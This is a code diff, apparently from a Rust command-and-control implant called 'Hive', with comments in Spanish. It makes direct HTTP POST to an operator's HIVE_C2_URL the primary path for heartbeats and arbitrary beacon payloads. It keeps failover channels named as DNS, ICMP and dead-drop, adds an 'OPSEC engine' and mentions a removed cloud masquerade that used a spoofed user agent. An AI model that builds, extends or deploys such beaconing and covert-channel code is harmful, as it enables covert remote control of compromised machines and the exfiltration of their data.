@@ -1,3 +1,7 @@
+// Ronda 11 (P2 del ROADMAP): lint progresivo - prohibido .unwrap() fuera de
+// tests en los modulos core del arena/protocolo. Los tests pueden usarlo.
+#![cfg_attr(not(test), deny(clippy::unwrap_used))]
+
 // Communication layer: shared-memory arena instead of TCP bus.
 // Each agent writes to and reads from a common ring buffer in shared memory.
 // No sockets, no ports, no separate bus process.
@@ -135,7 +139,13 @@ impl HiveChamber {
 
     /// Initialize the OPSEC engine lazily from agent identity.
     fn ensure_opsec(&self) -> std::sync::MutexGuard<'_, Option<OpsecEngine>> {
-        let mut guard = self.opsec_engine.lock().unwrap();
+        // Poison-recovery: el engine es reconstruible — si otro hilo
+        // paniqueó con el lock tomado, seguimos con el estado interior en
+        // vez de propagar el panic a todo el agente.
+        let mut guard = self
+            .opsec_engine
+            .lock()
+            .unwrap_or_else(|poisoned| poisoned.into_inner());
         if guard.is_none() {
             *guard = Some(OpsecEngine::new(self.identity.id().as_bytes()));
             info!("OPSEC: engine initialized for agent {}", self.identity.id());
@@ -269,15 +279,33 @@ impl HiveChamber {
             now
         );
 
-        // Send via FailoverDirector
+        // ── Entrega REAL al C2 (primaria, ronda 11) ──────────────────────
+        // Antes el beacon solo pasaba por el FailoverDirector, cuyo canal
+        // "Http" en realidad escribía un fichero en /tmp (lab) o POSTEABA a
+        // un proveedor cloud con UA suplantado (producción) — jamás llegaba
+        // al C2 mientras el log afirmaba "delivered via failover director".
+        // Ahora: POST directo a HIVE_C2_URL y, solo si falla, intento de
+        // canales alternativos del director (DNS/ICMP/dead-drop/lab sink).
+        let sent_direct = match std::env::var("HIVE_C2_URL") {
+            Ok(raw) if !raw.trim().is_empty() => {
+                let beacon_url = format!("{}/beacon", crate::task_poller::normalize_c2_base(&raw));
+                send_c2_beacon(&beacon_url, &beacon).await
+            }
+            _ => false,
+        };
+        if sent_direct {
+            info!("C2: heartbeat delivered to HIVE_C2_URL");
+        }
+
+        // Canales alternativos (experiments de transporte del lab).
         let sent_via_failover = {
             let mut guard = self.ensure_failover().await;
             if let Some(ref mut director) = *guard {
                 let results = director.send_with_failover(beacon.as_bytes()).await;
                 let success = results.iter().any(|r| r.success);
                 if success {
-                    info!("SMOKE: heartbeat sent via failover director");
-                } else {
+                    info!("SMOKE: heartbeat captured via alternate failover channel");
+                } else if !sent_direct {
                     warn!("SMOKE: all failover channels failed for heartbeat");
                 }
                 success
@@ -286,12 +314,11 @@ impl HiveChamber {
             }
         };
 
-        // Legacy fallback: raw HTTP to HIVE_C2_URL
-        if !sent_via_failover {
+        if !sent_direct && !sent_via_failover {
             if let Ok(c2_url) = std::env::var("HIVE_C2_URL") {
-                tokio::spawn(async move {
-                    send_c2_beacon(&c2_url, &beacon).await;
-                });
+                if !c2_url.trim().is_empty() {
+                    warn!("C2: heartbeat could not be delivered to {}", c2_url);
+                }
             }
         }
     }
@@ -326,15 +353,35 @@ impl HiveChamber {
 
     // ── send_beacon_c2 (multi-channel beaconing) ─────────────────────────────
 
-    /// Send an arbitrary beacon payload through the failover C2 channels.
+    /// Send an arbitrary beacon payload to the C2.
+    ///
+    /// Ronda 11: entrega DIRECTA a `HIVE_C2_URL` (POST `{base}/beacon`) como
+    /// camino primario; los canales alternativos del FailoverDirector
+    /// (DNS/ICMP/dead-drop y el sink de lab) solo se intentan si el directo
+    /// falla. Antes el payload iba SOLO por el director — cuyo canal "Http"
+    /// era el sink local o el masquerade cloud eliminado — y el log
+    /// afirmaba "delivered" sin que el C2 lo hubiese recibido jamás.
     pub async fn send_beacon_c2(&self, data: &[u8]) -> bool {
+        // Primario: HTTP directo al C2 del operador.
+        if let Ok(raw) = std::env::var("HIVE_C2_URL") {
+            if !raw.trim().is_empty() {
+                let beacon_url = format!("{}/beacon", crate::task_poller::normalize_c2_base(&raw));
+                let body = String::from_utf8_lossy(data).to_string();
+                if send_c2_beacon(&beacon_url, &body).await {
+                    info!("C2: beacon delivered to HIVE_C2_URL");
+                    return true;
+                }
+            }
+        }
+
+        // Respaldo: canales alternativos del director (experiments de lab).
         let mut guard = self.ensure_failover().await;
         if let Some(ref mut director) = *guard {
             let results = director.send_with_failover(data).await;
             let success = results.iter().any(|r| r.success);
             if success {
                 info!(
-                    "C2: beacon delivered via failover ({} channels tried)",
+                    "C2: beacon captured via alternate failover channel ({} tried)",
                     results.len()
                 );
             } else {
@@ -509,21 +556,27 @@ fn role_to_u8(role: &Role) -> u8 {
 }
 
 /// Legacy fallback: send a beacon via raw HTTPS POST.
-async fn send_c2_beacon(c2_url: &str, body: &str) {
+/// Devuelve `true` si el C2 respondió 2xx (ronda 11: antes se ignoraba el
+/// resultado y el log daba la entrega por buena sin saberlo).
+async fn send_c2_beacon(c2_url: &str, body: &str) -> bool {
     let client = match reqwest::Client::builder()
         .timeout(std::time::Duration::from_secs(5))
         .user_agent("Hive/3.0")
         .build()
     {
         Ok(c) => c,
-        Err(_) => return,
+        Err(_) => return false,
     };
-    let _ = client
+    match client
         .post(c2_url)
         .header("Content-Type", "application/json")
         .body(body.to_owned())
         .send()
-        .await;
+        .await
+    {
+        Ok(resp) => resp.status().is_success(),
+        Err(_) => false,
+    }
 }
 
 #[cfg(test)]
